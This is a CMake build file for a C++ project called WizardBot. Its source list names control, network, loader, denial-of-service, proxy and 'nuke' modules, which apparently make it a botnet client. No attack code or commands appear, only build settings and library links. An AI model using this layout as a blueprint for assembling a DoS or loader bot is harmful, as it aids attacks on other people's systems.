cmake_minimum_required(VERSION 3.15)

include(${CMAKE_BINARY_DIR}/conan_toolchain.cmake)
project(WizardBot LANGUAGES CXX)

# Set C++ standard
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED True)

# Set the compiler
set(CMAKE_CXX_COMPILER clang++)
set(CMAKE_C_COMPILER clang)

#file (GLOB_RECURSE SOURCES "*.cpp")
set (SOURCES
    Sources/ControlModule.cpp
    Sources/NetworkEssentials.cpp
    Sources/NetworkModule.cpp
    Sources/BotEssentials.cpp
    Sources/WizardBot.cpp
    Sources/NukeModule.cpp
    Sources/LoaderModule.cpp
    Sources/DoSModule.cpp
    Sources/ProxyModule.cpp
)

# Add the executable
add_executable(WizardBot ${SOURCES})
target_include_directories(WizardBot PRIVATE ${CMAKE_SOURCE_DIR}/Headers)
#target_include_directories(WizardBot PRIVATE /home/xpr/repos/wyvern/c++-implementation/Bot/Headers)

if (CMAKE_CXX_COMPILER_ID STREQUAL "Clang")
    message(STATUS "Using Clang++")
    target_compile_options(WizardBot PRIVATE 
      -Wall -Wextra -Wpedantic 
      -fsanitize=address,undefined
      -fno-omit-frame-pointer
      -g
    )
    target_link_options(WizardBot PRIVATE
      -fsanitize=address,undefined
    )
endif()

find_package(Boost REQUIRED)
find_package(OpenSSL REQUIRED)
find_package(fmt REQUIRED)

# Link dependencies to the target
target_link_libraries(WizardBot
    boost::boost
    openssl::openssl
    fmt::fmt-header-only
)
